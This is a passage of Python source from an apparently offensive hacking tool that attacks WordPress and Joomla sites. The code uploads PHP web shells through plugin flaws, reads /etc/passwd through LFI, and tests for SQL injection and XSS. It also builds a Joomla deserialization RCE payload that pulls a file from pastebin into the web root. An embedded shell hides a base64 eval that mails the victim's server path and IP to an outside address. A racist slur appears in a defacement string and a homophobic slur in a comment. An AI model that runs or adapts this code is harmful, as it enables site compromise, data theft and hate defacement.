        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}admin_email_reset {PURPLE}=>{RESET} {RED}Not Vuln")
        pass

def com_gmap(url):
    '''
    BROKENNNNN BC GAY
    '''
    #url = input("")
    
    HEADERS['Content_Type'] = 'multipart/form-data'
    options = {
        'file': open('shell/i.png', 'rb')
    }
    filename = "Results/shells.txt"
    endpoint = url + "/index.php?option=com_gmapfp&controller=editlieux&tmpl=component&task=edit_upload&lang=en"
    test = requests.get(endpoint, timeout=timeout)
    if "Upload the picture" in test.text:
        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}com_gmapfp {PURPLE}=> {GREEN}Vuln shell in {filename}")
        with open(filename, "a+") as f:
            f.write(test.url+'\n')
        f.close()
    #test = requests.post(endpoint, data=options,headers=HEADERS,verify=False)
    #print(test.text)



def wp_cherry(url):
        HEADERS['Content_Type'] = 'multipart/form-data'
        options = {
            'file': open('shell/hateme.php', 'rb')
        }
        endpoint = url + "/wp-content/plugins/cherry-plugin/admin/import-export/upload.php"
        requests.post(endpoint, data=options,headers=HEADERS,verify=False)
        dump_data = url + "/wp-content/plugins/cherry-plugin/admin/import-export/hateme.php?cmd=ls"
        content = requests.get(dump_data,headers=HEADERS,verify=False).text
        check_cherry = re.findall("Vulnnr on yo forehead", content)
        if check_cherry:
            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Cherry Upload {PURPLE}=>{RESET} {GREEN}Vuln")
            filename = "Results/shells.txt"
            with open(filename, "a+") as f:
                f.write(dump_data+'\n')
            f.close()
            return dict(
                url=url,
                name="CherryFramework ",
                status=True,
                shell=dump_data
            )
        else:
            print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Cherry Upload {PURPLE}=>{RESET} {RED}Not Vuln")
            return dict(
                url=url,
                name="CherryFramework ",
                status=False
            )

def wp_blaze(url):
        HEADERS['Content_Type'] = 'multipart/form-data'
        regex = re.compile(r'\/uploads\/blaze\/(.*?)\/big\/hateme.php')
        options = {
            'album_img': [open('shell/hateme.php', 'rb')],
            'task': 'blaze_add_new_album',
            'album_name': '',
            'album_desc': ''
        }
        endpoint = url + "/wp-admin/admin.php?page=blaze_manage"
        content = requests.post(endpoint, data=options, headers=HEADERS,verify=False).text
        check_blaze = re.findall(regex, content)
        if check_blaze:
            uploadfolder = check_blaze.group(1)
            dump_data = url + "/wp-content/uploads/blaze/"+uploadfolder+"/big/hateme.php?cmd=X"
            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Blaze_manager {PURPLE}=>{RESET} {GREEN}Vuln")
            filename = "Results/shells.txt"
            with open(filename, "a+") as f:
                f.write(dump_data)
            f.close()
            return dict(
                url=url,
                name="Blaze SlideShow ",
                status=True,
                shell=dump_data
            )
        else:
            print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Blaze_manager {PURPLE}=>{RESET} {RED}Not Vuln")
            
            return dict(
                url=url,
                name="Blaze SlideShow ",
                status=False
            )

def woocommerce(url):
    test = requests.get(url+"/wp-content/plugins/woocommerce/templates/emails/plain/")
    filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
    if test.status_code == 200:
        if "Index of" in test.text:
            with open(filename, "a+") as f:
                f.write(f"Directory Traversal: {test.url}\n\n")
                
            f.close()
            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}WooCommerce Directory Traversal {PURPLE}=>{RESET} {GREEN}Vuln saved to {GREEN}" + filename)
    else:
        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}WooCommerce Directory Traversal {PURPLE}=>{RESET} {RED}Not Vuln")

def audioplayer(url):
    test = requests.get(url+"/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl=/etc/passwd")
    if test.status_code == 200:
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
        if "root:x" in text.text:
            with open(filename, "a+") as f:
                f.write(f"EXPLOIT: {test.url}\n\n")
                f.write(test.text)
            f.close()
            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}audioplayer LFI {PURPLE}=>{RESET} {GREEN}Vuln saved to {GREEN}" + filename)
    else:
        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}audioplayer LFI {PURPLE}=>{RESET} {RED}Not Vuln")

def searchserver():
    '''
    Broken /;
    '''
    url = input("FD ")
    response = requests.get(url, headers=HEADERS).headers
    regx = re.compile(r"(.+) \((.+)\)")
    data = regx.search(response["server"])
    print(f"OS : {data}")


def wp_plugin(url):
    plugins_array = []
    getplugin = requests.get(url, headers=HEADERS).text
    matches = re.findall(re.compile(r'wp-content/plugins/(\w+)?/'), getplugin)
    if len(matches) > 0:
        for plugin in matches:
            if plugin not in plugins_array:
                plugins_array.append(plugin)
        for i in range(len(plugins_array)):
            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}"+'%sPlugins : %s%s ' % (RESET, GREEN, plugins_array[i]))

def wp_user(url):
    url + '/?author=1'
    getuser = requests.get(url, headers=HEADERS, timeout=timeout).text
    matches = re.search(re.compile(r'author/(\w+)?/'), getuser)
    if matches:
        user = matches.group(1)
        return print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}"+'%sUser :%s %s' % (RESET, GREEN, user))
    else:
        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Users: {RED}No Users{RESET}")
def wp_version(url):
    getversion = requests.get(url, headers=HEADERS, timeout=timeout).text
    # searching version content from the http response. \d{:digit} version form 0.0.0
    matches = re.search(re.compile(
        r'content=\"WordPress (\d{0,9}.\d{0,9}.\d{0,9})?\"'), getversion)
    if matches:
        version = matches.group(1)
        return print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}"+'%sWordpress Version :%s %s' % (RESET, GREEN, version) + f"{RESET}")
    else:
        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Version: {RED}No Version{RESET}")

def phpver(url):
    try:
        getvs = requests.get(url, timeout=timeout, headers=HEADERS).headers
        if "X-Powered-By" in getvs:
            print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Powered by {PURPLE}=> {GREEN}" + getvs['X-Powered-By'])
        if "Server" in getvs:
            print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Server {PURPLE}=> {GREEN}" + getvs['Server'])
        if getvs['Server'] == "cloudflare":
            u = requests.get(url+"/mailman/listinfo/mailman")
            if u.status_code == 200:
                output = subprocess.getoutput("curl "+url+"/mailman/listinfo/mailman -s | findstr POST").split('"')[1]
                print(f"{PURPLE} [ {GREEN}$ {PURPLE}] {RESET}Backend {PURPLE}=> {GREEN}{output.replace('/mailman/listinfo/mailman', '')}")

            #print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Backend {PURPLE}=> {GREEN}" + getvs['Server'])
        #if "Set-Cookie" in getvs:
            #print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Cookie {PURPLE}=> {GREEN}" + getvs['Set-Cookie'])
        else:
            pass
            #print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Serverinfo {PURPLE}=> {RED}Not Found")

    except:
        pass




def wp_dirs(url):
    
    
    dir1 = requests.get(url+"/wp-content/plugins/", timeout=timeout)
    url1 = dir1.url
    if "//" in dir1.url:
        url1 = dir1.url.replace("//", '/')
        pass
    if dir1.status_code == 200:
        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{url1}")
        pass
    dir2 = requests.get(url+"/wp-admin/install", timeout=timeout)
    url2 = dir2.url
    if "//" in dir2.url:
        url2 = dir2.url.replace("//", '/')
        pass
    if dir2.status_code == 200:
        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}{RESET}Found {GREEN}{url2}")
        
    dir3 = requests.get(url+"/wp-register.php", headers=HEADERS, timeout=timeout)
    
   

    url3 = dir3.url
    if "//" in dir3.url:
        url3 = dir3.url.replace("//", '/')
        pass
    
    if "?registration=disabled" in dir3.url:
        pass
    else:
        if dir3.status_code == 200:
            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{url3} {RESET}| {YELLOW}register.php might be enabled ")
        
        
    dir5 = requests.get(url+"/wp-content/themes/", timeout=timeout)
    url5 = dir5.url
    if "//" in dir5.url:
        url5 = dir5.url.replace("//", '/')
        pass
    if dir5.status_code == 200:
        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{url5}")

    dir6 = requests.get(url+"/wp-content/uploads/wp-backup-plus/", timeout=timeout)
    url6 = dir6.url
    if "//" in dir6.url:
        url6 = dir6.url.replace("//", '/')
        pass
    if dir6.status_code == 200:
        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{url6} {RESET}| {YELLOW} Take alook!")
    
    dir7 = requests.get(url+"/wp-content/uploads/wp-backup-plus-backups/", timeout=timeout)
    url7 = dir7.url
    if "//" in dir7.url:
        url7 = dir7.url.replace("//", '/')
        pass
    if dir7.status_code == 200:
        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{url7} {RESET}| {YELLOW} Take alook!")
        


def boldgrid(url):
    test = requests.get(url+"/wp-content/plugins/boldgrid-backup/cli/env-info.php", timeout=timeout)
    if test.status_code == 200:
        uwu = json.loads(test.text)
        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}boldgrid config {PURPLE}=>{RESET}{GREEN} Vuln {RESET}saved results to {GREEN}" + filename)
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
        with open(filename, "a+") as f:
            f.write(f"\nhttp_host: {uwu['http_host']}\n server_addr: {uwu['']}\n username: {uwu['username']}\nphp_uname: {uwu['php_uname']}")
        f.close()
    else:
        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}boldgrid config {PURPLE}=>{RESET} {RED} Not Vuln")

def spritz(url):
    test = requests.get(url+"wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd", timeout=timeout)
    if test.status_code == 200:
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
        if "root:x" in test.text:
            with open(filename, "a+") as f:
                f.write(f"EXPLOIT: {test.url}\n\n")
                f.write(test.text)
            f.close()
            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}spritz LFI {PURPLE}=>{GREEN} Vuln {RESET}saved results to {GREEN}" + filename)
    else:
        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}spritz LFI {PURPLE}=>{RESET} {RED} Not Vuln")

def soswaf(url):
    payload = "ls -la;whomai"
    test = requests.get(url+"wp-admin/admin-post.php?swp_debug=load_options&swp_url={payload}", timeout=timeout)
    if test.status_code == 500:
        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Social Warfare {PURPLE}=> {GREEN}Vuln")
        pass
    else:
        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Social Warfare {PURPLE}=> {RED}Not Vuln")
        

def lol(url):
    payload = "/etc/passwd"
    test = requests.get(url+"wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path={payload}", timeout=timeout)
    filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
    if test.status_code == 200:
        with open(filename, "a+") as f:
            f.write(test.text)
        f.close()
        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Site Editor {PURPLE}=> {GREEN}Vuln {RESET}results saved to {GREEN}"+filename)
    else:
        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Site Editor {PURPLE}=> {RED}Not Vuln")

def wp_themes(url):
    themes_array = []
    getthemes = requests.get(url, headers=HEADERS).text
    matches = re.findall(re.compile(r'themes/(\w+)?/'), getthemes)
    # loop for matching themes.)
    if len(matches) > 0:
        for theme in matches:
            if theme not in themes_array:
                themes_array.append(theme)
        for i in range(len(themes_array)):
            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}"+'%sThemes :%s %s ' % (RESET, GREEN, themes_array[i]))
    else:
        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Themes: {RED}No Themes")

def revslidercss(url):
    IndeXText = 'I Swear I Hate Niggers - VulnX'
    ency = {'action': 'revslider_ajax_action','client_action': 'update_captions_css',
       'data': "<body style='color: transparent;background-color: black'><center><h1><b style='color: white'>" + IndeXText + "<p style='color: transparent'>"
    }
    test = requests.post(url+"/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css", data=ency, timeout=10, headers=HEADERS)
    if 'I Swear I Hate Niggers - VulnX' in str(test.content):
        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}revslidercss {PURPLE}=> {GREEN} Vuln Deface here{RESET} {test.url}")
    else:
        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}revslidercss {PURPLE}=> {RED} Not Vuln")


def mailman():
   
    banner()
    print(f"{PURPLE} [ {GREEN}! {PURPLE}] {YELLOW}Method only works on pc/cmd sowwy adding linux support later")
    user = input(f" {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Target {PURPLE} =>{RESET} ")
    try:
        cpanelcheck = requests.get(f"{user}/cpanel")
        init_time = time.time()
        if cpanelcheck.status_code == 200:
            pass
        else:
            print(f" {PURPLE}[ {GREEN}? {PURPLE}] {RED}Error {PURPLE}=> {RESET}{user} Does not Have a Cpanel Redirect")
            return main()
    except:
        
        banner()
        return main()
    try:
        now = requests.get(f"{user}/mailman/listinfo/mailman")

        output = subprocess.getoutput("curl "+user+"/mailman/listinfo/mailman -s | findstr POST").split('"')[1]

        print(f"{PURPLE} [ {GREEN}$ {PURPLE}] {RESET}Backend {PURPLE}=> {RESET}{output.replace('/mailman/listinfo/mailman', '')}")
        end_time = time.time()
        elapsed_time = end_time - init_time
        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Elapsed Time {PURPLE}=>{RESET}"+' %.2f seconds ' % (elapsed_time)+"\n")

        dn = output.replace('/mailman/listinfo/mailman', '').replace("https:/", '')

        dns = requests.get(f"http://ip-api.com/json/{dn}").text
        print(f"\n {PURPLE}[ {GREEN}? {PURPLE}] {RESET}Would u like to get info on the backend?\n")
        usernext = input(f" {PURPLE}[ {GREEN}? {PURPLE}] {RESET}y/n {PURPLE}=>  {RESET}")
        if usernext == "y":
            pass
     
        elif usernext == "n":
            print("")
            return main()
        
        print(f"{PURPLE} [ {GREEN}$ {PURPLE}] {RESET}Backend Info{PURPLE} => {RESET}\n" + dns.replace(",", '\n').replace('"', '',).replace('{', '').replace('}', '').replace(':', ': '))
        

    #print(dns)
    except Exception as e:
        #os.system("cls;clear")
        print(e)
        banner()
        return main()


    return main()

def serialize(url):
        result = dict(
            name=detect(url)   
        )
        return result


def parms(site):
    ## LIL PRAM SPIDER

    filename = "Results/PramSpider.txt"
    GetLink = requests.get(site, timeout=10, headers=HEADERS)
    urls = re.findall('href=[\\\'"]?([^\\\'" >]+)', str(GetLink.text).replace(site, ''))
    if len(urls) != 0:
        #print(urls)
        prams = []
        for url in urls:
            if ".php?" in str(url):
                prams.append(site + '/' + url)
                
                for url in prams:
                    if "///" in urls:
                        pass
                    #print(url.replace('///', '/'))
                    
                    with open(filename, "a+") as f:
                        f.write(f"{url.replace('///', '/')}\n")
                        #f.write(test.text)
                    f.close()
        return print(f" {PURPLE}[ {GREEN}? {PURPLE}] {RESET}PramSpider {PURPLE}=> {GREEN}collected results and saved to {filename}")
    else:
        print(f" {PURPLE}[ {GREEN}? {PURPLE}] {RESET}PramSpider {PURPLE}=> {RED}None Found")
        

def xss(site):
    ## LIL PRAM SPIDER

    filename = "Results/XSS.txt"
    GetLink = requests.get(site, timeout=timeout, headers=HEADERS)
    urls = re.findall('href=[\\\'"]?([^\\\'" >]+)', str(GetLink.text).replace(site, ''))
    if len(urls) != 0:
        #print(urls)
        prams = []
        for url in urls:
            if ".php?" in str(url):
                prams.append(site + '/' + url)
                
                for url in prams:
                    if "///" in urls:
                        pass
                    #print(url.replace('///', '/'))
                    XSS = requests.get(url + '><h1>Vulnnr</h1>', timeout=timeout, headers=HEADERS)
                    if "404" in XSS.text:
                        pass
                    else:

                        if 'Vulnnr' in XSS.text:
                            
                            with open(filename, "a+") as f:
                                f.write(f"{url.replace('///', '/')}\n")
                                    #f.write(test.text)
                            f.close()
                            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}XSS Scanner {PURPLE}=> {GREEN}{url.replace('///', '/')} {RESET}| {YELLOW}might be false ")
            else:
                return print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}XSS Scanner {PURPLE}=> {RED}None Found")
                
def LFI(site):
    ## LIL PRAM SPIDER

    filename = "Results/LFISCAN.txt"
    GetLink = requests.get(site, timeout=timeout, headers=HEADERS)
    urls = re.findall('href=[\\\'"]?([^\\\'" >]+)', str(GetLink.text).replace(site, ''))
    if len(urls) != 0:
        #print(urls)
        prams = []
        for url in urls:
            if ".php?" in str(url):
                prams.append(site + '/' + url)
                
                for url in prams:
                    if "///" in urls:
                        pass
                    #print(url.replace('///', '/'))
                    LFI = requests.get(url + '../../../../../etc/passwd', timeout=timeout, headers=HEADERS)
                   
                    if 'root:x' in LFI.text:
                        
                        with open(filename, "a+") as f:
                            f.write(f"{url.replace('///', '/')}\n")
                                #f.write(test.text)
                        f.close()
                        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}LFI Scanner {PURPLE}=> {GREEN}{url.replace('///', '/')} {RESET}| {YELLOW}might be false ")
            else:
                return print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}LFI Scanner {PURPLE}=> {RED}None Found")

def Exploitt(site):
    try:
        GetLink = requests.get(site, timeout=10, headers=HEADERS)
        urls = re.findall('href=[\\\'"]?([^\\\'" >]+)', str(GetLink.content))
        #print(urls)
        if len(urls) != 0:
            return CheckSqliURL(site, urls)
        
            
            
        return print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Could not find prams to test for SQL")
    except Exception as e:
        #print(e)
        return 

def wp_id():
    url = input("")
    PostId = requests.get(url + '/wp-json/wp/v2/posts/', timeout=timeout)
    wsx = re.findall('"id":(.+?),"date"', PostId.text)
    postid = wsx[1].strip()
    print(postid)


def rce_url(url, user_agent):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3',
            'x-forwarded-for': user_agent
        }
        cookies = requests.get(url, headers=headers).cookies
        for _ in range(3):
            response = requests.get(url, headers=headers, cookies=cookies)
        return response

    except:
        pass

def generate_payload(php_payload):
    try:

        php_payload = "eval({0})".format(php_str_noquotes(php_payload))

        terminate = '\xf0\xfd\xfd\xfd';
        exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
        injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
        exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
        exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate

        return exploit_template

    except:
        pass

def rand_str(len=None):
    if len == None:
        len = 8
    return ''.join(rand('abcdefghijklmnopqrstuvwxyz', len))
shell = """ <?php echo 'Vulnnr'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>
<?php
eval(base64_decode('JHR1anVhbm1haWwgPSAnS2VsdWFyZ2FIbWVpN0B5YW5kZXguY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOw=='));
?>"""
def gf(url):
    
    filenames = 'hateme' + '__' + rand_str(5) + '.php'
    index = "shell/hateme.php5"
    appgrav = {'field_id': '3',
                   'form_id': '1',
                   'gform_unique_id': '../../../../',
                   'name': 'hateme.php5'}

    Grav = {'file': open(index, 'rb')}

    Gravreq = requests.post(url + '/?gf_page=upload', data=appgrav, files=Grav, timeout=timeout)

    Gravlib = requests.get(url + '/wp-content/_input_3_hateme.php5')

    if 'Vulnnr' in Gravlib.text:
        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Gravity Forms {PURPLE}=> {GREEN}Vuln{RESET}")
        open('Results/shells.txt', 'a+').write(url + '/wp-content/_input_3_hateme.php5' + '\n')
    else:
        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Gravity Forms {PURPLE}=> {RED}Not Vuln")

    showbizapp = {'action': 'showbiz_ajax_action',
                      'client_action': 'update_plugin'}

    showbizup = {'update_file': (filenames, shell, 'text/html')}

    showbizreq = requests.post(url + '/wp-admin/admin-ajax.php', data=showbizapp, files=showbizup, timeout=timeout)

    showbizlib = requests.get(url + '/wp-content/plugins/showbiz/temp/update_extract/' + filenames)

    if 'Vulnnr' in showbizlib.text:
        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}showbizlib EXP {PURPLE}=> {GREEN}Vuln{RESET}")
        open('Results/shells.txt', 'a').write(
            url + '/wp-content/plugins/revslider/temp/update_extract/' + filenames + '\n')
    else:
        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}showbizlib EXP {PURPLE}=> {RED}Not Vuln")


    pl = generate_payload(
            "fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/XxX.php','w+'),file_get_contents('https://pastebin.com/raw/za1Rf1kL'));")

    rce_url(url, pl)

    req_rce = requests.get(url + '/XxX.php?XxX', timeout=timeout)

    if 'GIF89a;' in req_rce.text:
        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}DOCUMENT_ROOT EXP {PURPLE}=> {GREEN}Vuln{RESET}")
        open('Results/shells.txt', 'a+').write(url + '/XxX.php?XxX' + '\n')
    else:
        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}DOCUMENT_ROOT EXP {PURPLE}=> {RED}Not Vuln")

    vuln_url = url + '/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&qqfile=/../../../' + filenames

    req_b2j = requests.post(vuln_url, data=shell, timeout=timeout)

    check_lib = requests.get(url + '/components/' + filenames)

    if 'Vulnnr' in check_lib.text:
        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}b2jcontact EXP {PURPLE}=> {GREEN}Vuln{RESET}")
        open('Results/shells.txt', 'a+').write(url + '/components/' + filenames + '\n')
    else:
        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}b2jcontact EXP {PURPLE}=> {RED}Not Vuln")


    Obra = requests.get(url, timeout=timeout)
    if "Created by Obra soft" in Obra.text:
        if "404" in Obra.text:
            pass
        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Obra SQL {PURPLE}=> {GREEN}Vuln{RESET} | {YELLOW} SQL Injection {GREEN}https://cxsecurity.com/issue/WLB-2021030187")
    else:
        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Obra SQL {PURPLE}=> {RED}Not Vuln")

def CheckSqliURL(site, urls):
    MaybeSqli = []
    try:
        for url in urls:
            try:
                if ".php?" in str(url):
                    MaybeSqli.append(site + '/' + url)
                
            except Exception as e:
                print(e)
                pass

        if len(MaybeSqli) != 0:
            return CheckSqli(MaybeSqli, site)
        return print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}SQL Injection {PURPLE}=> {RED}Not Found")
    except Exception as e:
        print(e)
        return 


def scanner():
    host = input(f" {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Target {PURPLE}=>{RESET} ")
    print(f" {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Choose the type of scan:\n")
    print(f" {PURPLE}[ {RED}* {PURPLE}]{RESET} 1. Full Port Scan(1-65535) \n {PURPLE}[ {RED}* {PURPLE}]{RESET} 2. Specific port range\n {PURPLE}[ {RED}* {PURPLE}]{RESET} 3. Single Port \n {PURPLE}[ {RED}* {PURPLE}]{RESET} 4. Most popular ports\n")
    type_of_scan = int(input(f" {PURPLE}[ {GREEN}? {PURPLE}] {RESET}Enter Your Choice: "))
    if type_of_scan == 1:
        ports = list(range(1, 65535))
    elif type_of_scan == 2:
        port1 = int(input(f" {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Enter starting port {PURPLE}=>{RESET} "))
        port2 = int(input(f" {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Enter ending port {PURPLE}=>{RESET} "))
        port2 += 1
        ports = list(range(port1, port2))
    elif type_of_scan == 3:
        ports = []
        ports.append(int(input(f" {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Enter the port to scan {RESET}=> ")))
    elif type_of_scan == 4:
        ports = [1, 5, 7, 18, 20, 21, 22, 23, 25, 43, 42, 53, 80, 109,
                 110, 115, 118, 443, 194, 161, 445, 156, 137, 139, 3306]
    else:
        print(f" {PURPLE}[ {RED}* {PURPLE}]{RESET} Wrong choice entered!")
        input()
        return
    
    
    socket.setdefaulttimeout(2)
    print(f" {PURPLE}[ {RED}* {PURPLE}]{RESET} Scanning "+host)
   
    host = socket.gethostbyname(host)
    print(f" {PURPLE}[ {RED}* {PURPLE}]{RESET} IP of host: "+host)

    try:
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((host, port))
            if result == 0:
                print(f" {PURPLE}[ {GREEN}$ {PURPLE}]{RESET} Port {PURPLE}=> {RESET}{port} Open")
            sock.close()

    except KeyboardInterrupt:
        return print(f" {PURPLE}[ {RED}* {PURPLE}]{RESET} You pressed Ctrl+C")
    except socket.gaierror:
        return print(f' {PURPLE}[ {RED}* {PURPLE}]{RESET} Hostname could not be resolved. Exiting')
    except socket.error:
        return print(f" {PURPLE}[ {RED}* {PURPLE}]{RESET}Couldn't connect to server")
    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Done")
    



def CheckSqli(MaybeSqli, site):
    for url in MaybeSqli:
        try:
            oop = ['MySQL','SQL','error','DB Error', 'SQL syntax;', 'mysql_fetch_assoc', 'mysql_fetch_array', 'mysql_num_rows','is_writable','mysql_result', 'pg_exec', 'mysql_result', 'mysql_num_rows', 'mysql_query', 'pg_query','System Error','io_error', 'privilege_not_granted', 'getimagesize', 'preg_match', 'mysqli_result', 'mysqli']
            errors = [
             'DB Error', 'SQL syntax;', 'mysql_fetch_assoc', 'mysql_fetch_array', 'mysql_num_rows',
             'is_writable',
             'mysql_result', 'pg_exec', 'mysql_result', 'mysql_num_rows', 'mysql_query', 'pg_query',
             'System Error',
             'io_error', 'privilege_not_granted', 'getimagesize', 'preg_match', 'mysqli_result', 'mysqli', 'MySQL']
            for s in oop:
                Checksqli = requests.get(url + "'", timeout=timeout, headers=HEADERS)
                if "SQL" in Checksqli.text:
                    SQLI = url.replace("'", '')
                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}SQL Injection {PURPLE}=> {GREEN}Vuln{RESET} | {GREEN}{SQLI}")
                    filename = "Results/SQLInjection.txt"
                    with open(filename, "a+") as f:
                        f.write(SQLI + '\n')

                if s in str(Checksqli.text):
                    SQLI = url.replace("'", '')
                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}SQL Injection {PURPLE}=> {GREEN}Vuln{RESET} | {GREEN}{SQLI}")
                    filename = "Results/SQLInjection.txt"
                    with open(filename, "a+") as f:
                        f.write(SQLI + '\n')
                if "syntax" in Checksqli.text:
                    SQLI = url.replace("'", '')
                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}SQL Injection {PURPLE}=> {GREEN}Vuln{RESET} | {GREEN}{SQLI}")
                    filename = "Results/SQLInjection.txt"
                    with open(filename, "a+") as f:
                        f.write(SQLI + '\n')
                if "error in" in Checksqli.text:
                    SQLI = url.replace("'", '')
                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}SQL Injection {PURPLE}=> {GREEN}Vuln{RESET} | {GREEN}{SQLI}")
                    filename = "Results/SQLInjection.txt"
                    with open(filename, "a+") as f:
                        f.write(SQLI + '\n')
                if "Warning" in Checksqli.text:
                    SQLI = url.replace("'", '')
                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}SQL Injection {PURPLE}=> {GREEN}Vuln{RESET} | {GREEN}{SQLI}")
                    filename = "Results/SQLInjection.txt"
                    with open(filename, "a+") as f:
